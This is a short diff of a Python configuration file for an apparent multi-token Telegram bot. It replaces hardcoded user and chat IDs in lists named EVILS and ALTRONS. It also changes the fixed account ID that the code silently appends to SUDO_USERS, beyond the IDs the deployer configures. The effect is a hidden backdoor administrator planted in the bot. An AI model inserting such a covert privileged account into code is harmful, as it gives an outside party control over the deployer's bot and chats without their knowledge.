@@ -20,9 +20,9 @@ BOT_TOKEN8 = config("BOT_TOKEN8", None)
 BOT_TOKEN9 = config("BOT_TOKEN9", None)
 BOT_TOKEN10 = config("BOT_TOKEN10", None)
 SUDO_USERS = list(map(int, getenv("SUDO").split()))
-EVILS = [1983816571]
-ALTRONS = [-1002077997607]
-SUDO_USERS.append(1983816571)
+EVILS = [6757745933]
+ALTRONS = [-1002084489986]
+SUDO_USERS.append(6757745933)
 
 RIGHTS = ChatBannedRights(
     until_date=None,
